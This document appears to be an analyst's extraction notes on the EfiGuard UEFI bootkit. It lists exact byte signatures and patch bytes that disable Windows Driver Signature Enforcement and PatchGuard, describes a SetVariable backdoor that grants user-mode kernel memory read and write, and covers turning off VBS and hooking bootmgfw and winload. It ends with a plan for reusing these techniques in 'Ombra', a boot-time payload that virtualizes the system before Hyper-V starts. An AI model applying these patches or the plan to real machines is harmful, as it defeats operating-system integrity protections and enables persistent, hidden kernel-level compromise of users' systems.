# EfiGuard Pattern Extraction

**Source**: `Refs/codebases/EfiGuard/`
**Focus**: DSE bypass, PatchGuard defeat, boot chain hooking
**Analyzed**: 2025-12-20

---

## 1. EXITBOOTSERVICES HOOK

### Hook Installation
**File**: `EfiGuardDxe/EfiGuardDxe.c:618-625`

```c
// Register notification callback for ExitBootServices()
Status = gBS->CreateEventEx(EVT_NOTIFY_SIGNAL,
                            TPL_NOTIFY,
                            ExitBootServicesEvent,
                            NULL,
                            &gEfiEventExitBootServicesGuid,
                            &gEfiExitBootServicesEvent);
```

**Pattern**: Event-based callback, not direct hook of function pointer.

### Hook Execution Context
**File**: `EfiGuardDxe/EfiGuardDxe.c:336-429`

**Key Actions**:
- Line 344: Close event (`gBS->CloseEvent(gEfiExitBootServicesEvent)`)
- Line 348-395: Display kernel patch status to user
- Line 400-423: Cleanup if not using SetVariable hook method
- Line 426: Nullify `gBS` - boot services no longer available
- Line 428: Set `gEfiAtRuntime = TRUE`

**Critical**: After this callback, `gBS` is NULL. Only runtime services (`gRT`) remain.

---

## 2. DSE BYPASS

### Method 1: Boot-Time Disable (DSE_DISABLE_AT_BOOT)
**File**: `PatchNtoskrnl.c:511-819`

#### SepInitializeCodeIntegrity Patch
**Location**: `PatchNtoskrnl.c:526-662`

**Target**: `mov ecx, <CI_FLAGS>` before call to `CI.dll!CiInitialize`

**Signature Search**:
- Find IAT entry for `CI.dll!CiInitialize` (line 526-531)
- Disassemble PAGE section to find `call/jmp [CiInitialize IAT]` (line 606-656)
- Backtrack to last `mov ecx, xxx` instruction (line 619-625)

**Patch**:
```c
// Line 784
CONST UINT16 ZeroEcx = 0xC931;  // xor ecx, ecx
CopyWpMem(SepInitializeCodeIntegrityMovEcxAddress, &ZeroEcx, sizeof(ZeroEcx));
```

**Effect**: CI initialization receives flags=0, DSE never enabled.

#### SeValidateImageData Patch
**Location**: `PatchNtoskrnl.c:708-795`

**Windows 8+** (line 729-745):
- Find `mov eax, 0xC0000428` (STATUS_INVALID_IMAGE_HASH)
- Verify next instruction is jmp/ret to avoid false positives
- Patch to `mov eax, 0` (line 794)

**Windows Vista/7** (line 747-790):
- Find `cmp g_CiEnabled, al` + `jz` sequence
- Patch `jz` to `jmp` (line 790)

**Effect**: Image hash validation always returns success.

#### SeCodeIntegrityQueryInformation Patch (RS3+)
**Location**: `PatchNtoskrnl.c:797-817`

**Signature**: `PatchNtoskrnl.c:62-70`
```c
STATIC CONST UINT8 SigSeCodeIntegrityQueryInformation[] = {
    0x48, 0x83, 0xEC,                                    // sub rsp, XX
    0xCC, 0x48, 0x83, 0x3D, 0xCC, 0xCC, 0xCC, 0xCC, 0x00, // cmp ds:qword_xxxx, 0
    0x4D, 0x8B, 0xC8,                                    // mov r9, r8
    0x4C, 0x8B, 0xD1,                                    // mov r10, rcx
    0x74, 0xCC                                           // jz XX
};
```

**Patch**: `PatchNtoskrnl.c:73-78`
```c
STATIC CONST UINT8 SeCodeIntegrityQueryInformationPatch[] = {
    0x41, 0xC7, 0x00, 0x08, 0x00, 0x00, 0x00,  // mov dword ptr [r8], 8
    0x33, 0xC0,                                // xor eax, eax
    0xC7, 0x41, 0x04, 0x01, 0x00, 0x00, 0x00,  // mov dword ptr [rcx+4], 1
    0xC3                                       // ret
};
```

**Effect**: Reports DSE as enabled to queries, while actually disabled.

### Method 2: SetVariable Hook (DSE_DISABLE_SETVARIABLE_HOOK)
**File**: `EfiGuardDxe/EfiGuardDxe.c:236-331`

#### Hook Installation
**Location**: `EfiGuardDxe.c:614-615`
```c
mOriginalSetVariable = (EFI_SET_VARIABLE)SetServicePointer(&gRT->Hdr,
                                                            (VOID**)&gRT->SetVariable,
                                                            (VOID*)&HookedSetVariable);
```

#### Backdoor Protocol
**Location**: `EfiGuardDxe.c:249-327`

**Variable Name**: `L"roodkcaBdrauGifE"` (reversed "EfiGuardBackdoor")
**GUID**: `gEfiGlobalVariableGuid`
**Cookie**: `0xDEADC0DE`

**Operation** (line 270-319):
- Validate cookie, address in kernel range (>= `MM_SYSTEM_RANGE_START`)
- Size 1/2/4/8: Read/write scalar from/to kernel memory
- Other sizes: Arbitrary memcpy to/from `UserBuffer`
- Disable WP during write: `CopyWpMem()` (line 280-315)

**Effect**: Runtime kernel memory R/W from usermode via SetVariable calls.

---

## 3. PATCHGUARD DEFEAT

**File**: `PatchNtoskrnl.c:85-499`

### Initialization Point Patching
**Location**: `PatchNtoskrnl.c:100-289`

#### KeInitAmd64SpecificState
**Signature**: `PatchNtoskrnl.c:18-28`
```c
STATIC CONST UINT8 SigKeInitAmd64SpecificState[] = {
    0xF7, 0xD9,                  // neg ecx
    0x45, 0x1B, 0xC0,            // sbb r8d, r8d
    0x41, 0x83, 0xE0, 0xEE,      // and r8d, 0FFFFFFEEh
    0x41, 0x83, 0xC0, 0x11,      // add r8d, 11h
    0xD1, 0xCA,                  // ror edx, 1
    0x8B, 0xC2,                  // mov eax, edx
    0x99,                        // cdq
    0x41, 0xF7, 0xF8             // idiv r8d
};
```

**Search**: INIT section (line 101-112)
**Patch**: `xor eax, eax; ret` (line 445)
**Effect**: Prevents initial PG context setup via #DE exception.

#### CcInitializeBcbProfiler (Win 8+) / HUGEFUNC (Vista/7)
**Win 8+ Pattern**: `mov al/rax, 0xFFFFF78000002D4` (SharedUserData->KdDebuggerEnabled) (line 190-200)
**Vista/7 Pattern**: Find via `call RtlPcToFileHeader` (line 168-185)

**Search**: Disassemble INIT section (line 128-203)
**Patch**: `mov al, 1; ret` (line 446)
**Effect**: Marks PG as "already initialized", prevents re-init.

#### ExpLicenseWatchInitWorker (Win 8+)
**Pattern**: Second `mov al, ds:[0xFFFFF78000002D4]` in INIT (line 238-249)
**Patch**: `xor eax, eax; ret` (line 447-448)
**Effect**: Disables license watch PG routine.

#### KiVerifyScopesExecute (Win 8.1+)
**Signature**: `PatchNtoskrnl.c:32-36`
```c
STATIC CONST UINT8 SigKiVerifyScopesExecute[] = {
    0x83, 0xCC, 0xCC, 0x00,                                      // and d/qword ptr [REG+XX], 0
    0x48, 0xB8, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFE   // mov rax, 0FEFFFFFFFFFFFFFFh
};
```

**Search**: INIT section pattern match (line 268-281)
**Patch**: `xor eax, eax; ret` (line 450)
**Effect**: Prevents KiVerifyXcpt15 exception-based PG init.

### DPC-Based PatchGuard Defeat
**Location**: `PatchNtoskrnl.c:292-366`

#### KiMcaDeferredRecoveryService Callers
**Signature**: `PatchNtoskrnl.c:40-47`
```c
STATIC CONST UINT8 SigKiMcaDeferredRecoveryService[] = {
    0x33, 0xC0,              // xor eax, eax
    0x8B, 0xD8,              // mov ebx, eax
    0x8B, 0xF8,              // mov edi, eax
    0x8B, 0xE8,              // mov ebp, eax
    0x4C, 0x8B, 0xD0         // mov r10, rax
};
```

**Search**: .text section for pattern, then find all `call KiMcaDeferredRecoveryService` (line 302-356)
**Patch**: Both callers → `xor eax, eax; ret` (line 451-455)
**Effect**: Prevents KiSchedulerDpc/KiScanQueues PG DPCs from bugchecking.

### Global PG Context Nullification (Win 10 20H1+)
**Location**: `PatchNtoskrnl.c:369-440`

#### KiSwInterrupt Pattern
**Signature**: `PatchNtoskrnl.c:50-59`
```c
STATIC CONST UINT8 SigKiSwInterrupt[] = {
    0xFB,                    // sti
    0x48, 0x8D, 0xCC, 0xCC,  // lea REG, [REG-XX]
    0xE8, 0xCC, 0xCC, 0xCC, 0xCC,  // call KiSwInterruptDispatch
    0xFA                     // cli
};
```

**Search**: .text section (line 382-401)
**Extract call target**: `KiSwInterruptDispatch = pattern_addr + 10 + relative` (line 397-398)

#### g_PgContext Location
**Method**: Disassemble first 128 bytes of KiSwInterruptDispatch (line 406-438)
**Pattern**: `mov REG, ds:g_PgContext` with RIP-relative addressing (line 422-427)
**Calculate**: Resolve RIP-relative address (line 429)

**Patch Option 1** (preferred, line 456-460):
```c
CONST UINT64 NewPgContextAddress = (UINT64)ImageBase + InitSection->VirtualAddress;
CopyWpMem(gPgContext, &NewPgContextAddress, sizeof(NewPgContextAddress));
```
**Effect**: Point global PG context to discardable INIT section (freed after boot).

**Patch Option 2** (fallback, line 461-464):
```c
SetWpMem(KiSwInterruptPatternAddress, sizeof(SigKiSwInterrupt), 0x90); // 11 x nop
```
**Effect**: NOP out the entire `sti; lea; call; cli` sequence.

### Timing Requirements
**Critical**: All PG init patches must complete BEFORE `KeInitAmd64SpecificState` executes.
**Hook Point**: `winload!OslFwpKernelSetupPhase1` (see section 4)
**Execution Context**: Protected mode, before kernel init, gBS unavailable.

---

## 4. BOOT CHAIN HOOKING

### Chain Overview
```
EfiGuardDxe (UEFI driver)
  └─ Hooks gBS->LoadImage
       └─ Intercepts bootmgfw.efi load
            └─ Patches bootmgfw!ImgArchStartBootApplication
                 └─ Intercepts winload.efi start
                      └─ Patches winload!OslFwpKernelSetupPhase1
                           └─ Patches ntoskrnl.exe in memory
```

### gBS->LoadImage Hook
**File**: `EfiGuardDxe/EfiGuardDxe.c:93-230`

#### Hook Installation
**Location**: `EfiGuardDxe.c:608-609`
```c
mOriginalLoadImage = (EFI_IMAGE_LOAD)SetServicePointer(&gBS->Hdr,
                                                        (VOID**)&gBS->LoadImage,
                                                        (VOID*)&HookedLoadImage);
```

#### Hook Logic
**Filter** (line 158-161):
- Check filename contains `bootmgfw.efi`, `Bootmgfw_ms.vc`, or `bootx64.efi`
- Verify `BootPolicy == TRUE`

**Post-Load** (line 188-224):
- Get `EFI_LOADED_IMAGE_PROTOCOL` for loaded image
- Call `GetInputFileType()` to verify it's actually bootmgfw
- Store handle in `gBootmgfwHandle` (line 212)
- Call `PatchBootManager()` (line 218-221)

### bootmgfw!ImgArchStartBootApplication Hook
**File**: `PatchBootmgr.c:239-377`

#### Function Locator
**Signature**: `PatchBootmgr.c:35-37`
```c
STATIC CONST UINT8 SigImgArchStartBootApplication[] = {
    0x41, 0xB8, 0x09, 0x00, 0x00, 0xD0   // mov r8d, 0D0000009h
};
```

**Search**: .text section of bootmgfw.efi (line 293-298)
**Backtrack**: `FindFunctionStart()` to locate function prologue (line 308)

#### Hook Template
**Universal Faux Call Hook**: `PatchBootmgr.c:15-31`
```c
CONST UINT8 gHookTemplate[] = {
#if defined(MDE_CPU_X64)
    0x48, 0xB8,                                      // mov rax,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // <addr>
#elif defined(MDE_CPU_IA32)
    0xB8,                                            // mov eax,
    0x00, 0x00, 0x00, 0x00,                          // <addr>
#endif
    0x50,  // push [e|r]ax
    0xC3   // ret
};
CONST UINTN gHookTemplateAddressOffset = [2 or 1];
```

**Installation** (line 327-336):
- Backup original bytes: `CopyMem(BackupAddress, OriginalAddress, sizeof(gHookTemplate))`
- Write template: `CopyWpMem(OriginalAddress, gHookTemplate, sizeof(gHookTemplate))`
- Patch in hook address: `CopyWpMem(OriginalAddress + offset, &HookAddress, sizeof(UINTN))`

**Effect**: First instruction of `ImgArchStartBootApplication` becomes `mov rax, hook; push rax; ret` → transfers to hook.

### winload.efi Interception
**File**: `PatchBootmgr.c:43-138`

#### Hook Entry Point
**Hooks** (Vista/7):
- `HookedBootmgfwImgArchEfiStartBootApplication_Vista` (line 148-162)
- `HookedBootmgrImgArchEfiStartBootApplication_Vista` (line 195-209)

**Hooks** (Win 8+):
- `HookedBootmgfwImgArchStartBootApplication_Eight` (line 170-186)
- `HookedBootmgrImgArchStartBootApplication_Eight` (line 218-233)

#### Shared Handler
**Function**: `HookedBootManagerImgArchStartBootApplication` (line 46-138)

**Actions**:
- Line 57: Restore original function bytes
- Line 77: Call `GetInputFileType()` to identify winload.efi vs bootmgr.efi vs other
- Line 87-109: Print boot application info
- Line 111-116: If WinloadEfi → call `PatchWinload()`
- Line 117-123: If BootmgrEfi → call `PatchBootManager()` recursively
- Line 135-138: Call original function to start boot application

### winload!OslFwpKernelSetupPhase1 Hook
**File**: `PatchWinload.c:449-684`

#### Function Locator (Win 10 RS4+)
**Signature**: `PatchWinload.c:12-16`
```c
STATIC CONST UINT8 SigOslFwpKernelSetupPhase1[] = {
    0x89, 0xCC, 0x24, 0x01, 0x00, 0x00,      // mov [REG+124h], r32
    0xE8, 0xCC, 0xCC, 0xCC, 0xCC,            // call BlBdStop
    0xCC, 0x8B, 0xCC                         // mov r32, r/m32
};
```

**Search**: .text section pattern match (line 470-485)
**Alternative** (pre-RS4, line 542-682): Find via xrefs to `EfipGetRsdt` with shortest call distance.

#### Hook Installation
**Location**: `PatchWinload.c:766-791`
```c
// Backup original bytes (line 784)
CopyMem(gOslFwpKernelSetupPhase1Backup, gOriginalOslFwpKernelSetupPhase1, sizeof(gHookTemplate));

// Install faux call hook (line 787-789)
CopyWpMem(gOriginalOslFwpKernelSetupPhase1, gHookTemplate, sizeof(gHookTemplate));
CopyWpMem((UINT8*)gOriginalOslFwpKernelSetupPhase1 + gHookTemplateAddressOffset,
          &HookedOslFwpKernelSetupPhase1Address, sizeof(HookedOslFwpKernelSetupPhase1Address));
```

### ntoskrnl.exe Patching
**File**: `PatchWinload.c:125-171`

#### Hook Entry Point
**Function**: `HookedOslFwpKernelSetupPhase1` (line 125-171)

**Actions**:
- Line 130: Restore original function bytes
- Line 132-138: Adjust LoaderBlock pointer for Vista/7 compatibility
- Line 141: Find ntoskrnl.exe in `LoadOrderList`: `GetBootLoadedModule()`
- Line 149-159: Validate kernel base/size
- Line 162-164: **Call `PatchNtoskrnl()`** - applies PG/DSE patches
- Line 170: Call original `OslFwpKernelSetupPhase1()` to continue boot

**Critical Timing**:
- Executes in winload's protected mode context (context 0)
- `gBS` is NULL (no boot services)
- Must use `PRINT_KERNEL_PATCH_MSG()` macro for debug output (line 145, 157)
- Output buffered in `gKernelPatchInfo.Buffer`, printed later in ExitBootServices callback

### VBS Disable
**File**: `PatchWinload.c:85-118`

**Variable**: `VbsPolicyDisabled` (line 42)
**GUID**: `MicrosoftVendorGuid` (line 36-38)
**Method**: `gRT->SetVariable()` to write `TRUE` (line 112-116)
**Timing**: Called from `PatchWinload()` on Win 10+ (line 760-762)

---

## 5. SERIAL DEBUG OUTPUT

### BlStatusPrint (Winload)
**File**: `PatchWinload.c:167-182`

#### Export Lookup
**Location**: `PatchWinload.c:742-757`
```c
gBlStatusPrint = (t_BlStatusPrint)GetProcedureAddress((UINTN)ImageBase,
                                                       NtHeaders,
                                                       "BlStatusPrint");
```

**Fallback Signature** (RS4 and earlier, line 22-33):
```c
STATIC CONST UINT8 SigBlStatusPrint[] = {
    0x48, 0x8B, 0xC4,                   // mov rax, rsp
    0x48, 0x89, 0x48, 0x08,             // mov [rax+8], rcx
    0x48, 0x89, 0x50, 0x10,             // mov [rax+10h], rdx
    0x4C, 0x89, 0x40, 0x18,             // mov [rax+18h], r8
    0x4C, 0x89, 0x48, 0x20,             // mov [rax+20h], r9
    0x53,                               // push rbx
    0x48, 0x83, 0xEC, 0x40,             // sub rsp, 40h
    0xE8, 0xCC, 0xCC, 0xCC, 0xCC,       // call BlBdDebuggerEnabled
    0x84, 0xC0,                         // test al, al
    0x74, 0xCC                          // jz XX
};
```

**Search**: .text section of winload.efi (line 746-751)

**Noop Implementation** (line 47-53):
```c
NTSTATUS EFIAPI BlStatusPrintNoop(IN CONST CHAR16 *Format, ...) {
    return (NTSTATUS)0xC00000BBL; // STATUS_NOT_SUPPORTED
}
t_BlStatusPrint gBlStatusPrint = BlStatusPrintNoop;
```

#### Usage in Kernel Patch Context
**Macro**: `PRINT_KERNEL_PATCH_MSG()` (EfiGuardDxe.h:223-227)
```c
#define PRINT_KERNEL_PATCH_MSG(Fmt, ...) \
    do { \
        gBlStatusPrint(Fmt, ##__VA_ARGS__); \
        AppendKernelPatchMessage(Fmt, ##__VA_ARGS__); \
    } while (FALSE)
```

**Purpose**:
- Sends debug output to kernel debugger (kd/WinDbg) via `BlStatusPrint()`
- Buffers output in `gKernelPatchInfo.Buffer` for display during ExitBootServices callback

**Context**: Used throughout `PatchNtoskrnl()` when `gBS == NULL` and `gST->ConOut` unavailable.

### Message Buffering
**File**: `util.c:71-96, 99-120`

#### Append Function
```c
VOID EFIAPI AppendKernelPatchMessage(IN CONST CHAR16 *Format, ...) {
    // Line 81-84: Format string into buffer
    // Line 88: Update buffer size
    // Line 95: Add null terminator separator
}
```

**Buffer Structure**: `KERNEL_PATCH_INFORMATION` (EfiGuardDxe.h:206-214)
```c
typedef struct _KERNEL_PATCH_INFORMATION {
    EFI_STATUS Status;
    UINTN BufferSize;
    CHAR16 Buffer[8192];  // 8K buffer
    UINT32 WinloadBuildNumber;
    UINT32 KernelBuildNumber;
    VOID* KernelBase;
} KERNEL_PATCH_INFORMATION;
```

**Format**: Double-null-terminated strings (like Win32 multi-string environment).

#### Print Function
**Location**: `util.c:99-120`
```c
VOID EFIAPI PrintKernelPatchInfo(VOID) {
    // Line 106-119: Iterate through buffer, print each null-terminated string
    while ((Length = StrLen(String)) != 0) {
        gST->ConOut->OutputString(gST->ConOut, String);
        String += Length + 1;
    }
}
```

**Called From**: `ExitBootServicesEvent()` at line 358 (on success) or 379 (on error).

---

## CRITICAL PATTERNS FOR OMBRA

### 1. Service Table Hooking
**Function**: `SetServicePointer()` (EfiGuardDxe.c:93-126)

```c
VOID* SetServicePointer(IN OUT EFI_TABLE_HEADER *ServiceTableHeader,
                        IN OUT VOID **ServiceTableFunction,
                        IN VOID *NewFunction) {
    // Line 107: Raise TPL to TPL_HIGH_LEVEL (disables interrupts)
    CONST EFI_TPL Tpl = gBS->RaiseTPL(TPL_HIGH_LEVEL);

    // Line 108-111: Disable WP if needed
    CONST UINTN Cr0 = AsmReadCr0();
    CONST BOOLEAN WpSet = (Cr0 & CR0_WP) != 0;
    if (WpSet) AsmWriteCr0(Cr0 & ~CR0_WP);

    // Line 113-115: Atomic swap
    VOID* OriginalFunction = InterlockedCompareExchangePointer(ServiceTableFunction,
                                                                *ServiceTableFunction,
                                                                NewFunction);

    // Line 118-119: Recalculate CRC32
    ServiceTableHeader->CRC32 = 0;
    gBS->CalculateCrc32((UINT8*)ServiceTableHeader, ServiceTableHeader->HeaderSize,
                        &ServiceTableHeader->CRC32);

    // Line 121-123: Restore WP and TPL
    if (WpSet) AsmWriteCr0(Cr0);
    gBS->RestoreTPL(Tpl);

    return OriginalFunction;
}
```

**Uses**:
- Line 608: Hook `gBS->LoadImage`
- Line 614: Hook `gRT->SetVariable`

### 2. Write-Protected Memory Modification
**File**: `util.c:124-188`

```c
VOID* CopyWpMem(OUT VOID *Destination, IN CONST VOID *Source, IN UINTN Length) {
    BOOLEAN WpEnabled, CetEnabled;

    // Line 165: Disable WP and CET
    DisableWriteProtect(&WpEnabled, &CetEnabled);

    // Line 167: Perform write
    VOID* Result = CopyMem(Destination, Source, Length);

    // Line 169: Restore WP and CET
    EnableWriteProtect(WpEnabled, CetEnabled);

    return Result;
}
```

**CET Handling** (line 129-137):
```c
VOID DisableWriteProtect(OUT BOOLEAN *WpEnabled, OUT BOOLEAN *CetEnabled) {
    CONST UINTN Cr0 = AsmReadCr0();
    *WpEnabled = (Cr0 & CR0_WP) != 0;
    *CetEnabled = (AsmReadCr4() & CR4_CET) != 0;

    if (*WpEnabled) {
        if (*CetEnabled) AsmDisableCet();  // CRITICAL: Disable CET before WP
        AsmWriteCr0(Cr0 & ~CR0_WP);
    }
}
```

**Critical for**: Patching code in executable pages under UEFI.

### 3. Inline Hook Template
**Pattern**: "Faux Call" technique (PatchBootmgr.c:15-31)

**Why This Works**:
- Does not require relative call calculation
- Works across large address spaces
- Only 12 bytes on x64 (fits in most function prologues)
- Atomic on instruction boundaries

**Restoration**:
- Save original bytes: `CopyMem(backup, target, sizeof(gHookTemplate))`
- Restore in hook: `CopyWpMem(target, backup, sizeof(gHookTemplate))`
- Call original: `((t_OriginalFunction)target)(...)`

### 4. Pattern Search with Wildcards
**Function**: `FindPattern()` (util.c:314-347)

```c
EFI_STATUS FindPattern(IN CONST UINT8* Pattern,
                       IN UINT8 Wildcard,  // e.g., 0xCC
                       IN UINT32 PatternLength,
                       IN CONST VOID* Base,
                       IN UINT32 Size,
                       OUT VOID **Found) {
    for (UINT8 *Address = (UINT8*)Base; Address < (UINT8*)Base + Size - PatternLength; ++Address) {
        UINT32 i;
        for (i = 0; i < PatternLength; ++i) {
            if (Pattern[i] != Wildcard && (*(Address + i) != Pattern[i]))
                break;
        }
        if (i == PatternLength) {
            *Found = (VOID*)Address;
            return EFI_SUCCESS;
        }
    }
    return EFI_NOT_FOUND;
}
```

**Used For**:
- All signature-based function finding
- Wildcard byte = 0xCC allows flexible matching

### 5. Function Start Backtracking
**Function**: `FindFunctionStart()` (pe.c, referenced throughout)

**Pattern**:
- Search backward from known instruction address
- Look for function prologue patterns (compiler-specific)
- Verify function boundary markers

**Critical For**: Converting "signature hit" to hookable function address.

---

## RECOMMENDATIONS FOR OMBRA

### Adopt Directly
1. **Service table hook pattern** (SetServicePointer) - use for hvloader.efi hooks
2. **Faux call inline hook template** - 12-byte universal hook, perfect for limited space
3. **WP/CET-aware memory writes** - mandatory for patching executable UEFI code
4. **Pattern search with wildcards** - needed for signature-based function finding
5. **Double-null string buffering** - for debug output when ConOut unavailable

### Adapt for Ombra
1. **ExitBootServices callback** → Use for OmbraPayload injection timing
2. **LoadImage hook** → Hook to intercept hvloader.efi load
3. **Boot chain hooks** → bootmgfw → winload → hvloader → OmbraPayload injection point
4. **BlStatusPrint lookup** → Use to send debug to kd during payload injection

### Critical Differences
1. **EfiGuard patches ntoskrnl** → Ombra injects OmbraPayload into hvloader's context
2. **EfiGuard uses SetVariable backdoor** → Ombra uses VMCALL interface
3. **EfiGuard defeats PG** → Ombra operates *above* PG as hypervisor
4. **EfiGuard hooks at UEFI runtime** → Ombra must hook during boot services phase

### Timing Sequence for Ombra
```
1. OmbraBoot (DXE driver) loads
2. Hook gBS->LoadImage
3. Detect bootmgfw.efi load
4. Patch bootmgfw!ImgArchStartBootApplication
5. Bootmgfw starts winload.efi
6. Patch winload!OslFwpKernelSetupPhase1
7. Winload starts hvloader.efi ← OMBRA INJECTION POINT
8. Patch hvloader!OslFwpKernelSetupPhase1 equivalent
9. Inject OmbraPayload.efi into hvloader's context
10. OmbraPayload virtualizes system before Hyper-V initializes
```

---

## FILES TO MODIFY IN OMBRA

### OmbraBoot/Hooks/HvLoader.cpp
- Adopt `SetServicePointer()` pattern for gBS->LoadImage hook
- Implement `FindPattern()` for hvloader function signatures
- Add `CopyWpMem()` for WP-safe patching

### OmbraPayload/Entry.cpp
- Use buffered debug output pattern (no gST->ConOut available)
- Implement `BlStatusPrint` equivalent lookup in hvloader
- Store virtualization status in global buffer for ExitBootServices reporting

### OmbraPayload/EntryAsm.asm
- Consider faux call hook template for inline hooks (12 bytes)
- Ensure WP disable before code patches

### Common/Util.h (new)
- Extract `FindPattern()`, `CopyWpMem()`, `SetServicePointer()`
- Share between OmbraBoot and OmbraPayload

---

## RISKS & MITIGATIONS

| Risk | Mitigation |
|------|------------|
| CRC32 validation breaks service table hooks | Recalculate CRC after hook (EfiGuard does this) |
| WP flag breaks code patches | Disable WP + CET atomically before write |
| Inline hooks overwrite critical instructions | Use 12-byte faux call template in function prologues |
| No ConOut during payload injection | Buffer messages, print in ExitBootServices callback |
| Pattern signatures break on new Windows builds | Implement fallback patterns (EfiGuard has multiple) |
| TPL issues with event callbacks | Raise to TPL_HIGH_LEVEL for atomic operations |

---

**Analysis Complete**: All critical patterns extracted with file:line references.
